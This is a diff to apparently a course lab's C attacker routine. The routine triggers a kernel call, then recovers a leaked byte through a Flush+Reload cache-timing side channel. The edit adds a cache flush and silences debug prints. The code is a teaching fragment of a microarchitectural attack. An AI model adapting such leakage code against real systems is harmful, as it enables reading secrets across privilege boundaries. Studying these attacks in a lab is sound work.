@@ -66,15 +66,16 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         //Use call kernel to access data
         call_kernel_part1(kernel_fd, shared_memory, current_offset);
+        clflush((void*)(shared_memory+current_offset));
 
         //Reload and measure time and Decode the transmission to get data
         for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 64) {
             dram_latency = time_access((void*)(shared_memory+flush_offset));
             clflush((void*)(shared_memory+flush_offset));
-            printf("\n This is the cache line access latency: %li", dram_latency);
+            //printf("\n This is the cache line access latency: %li", dram_latency);
             if (dram_latency < 70){
                 leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
-                printf("\n This is the char we leaked %li, %li", dram_latency, (flush_offset/4096));
+                //printf("\n This is the char we leaked %li, %li", dram_latency, (flush_offset/4096));
                 //break;
             }
         }
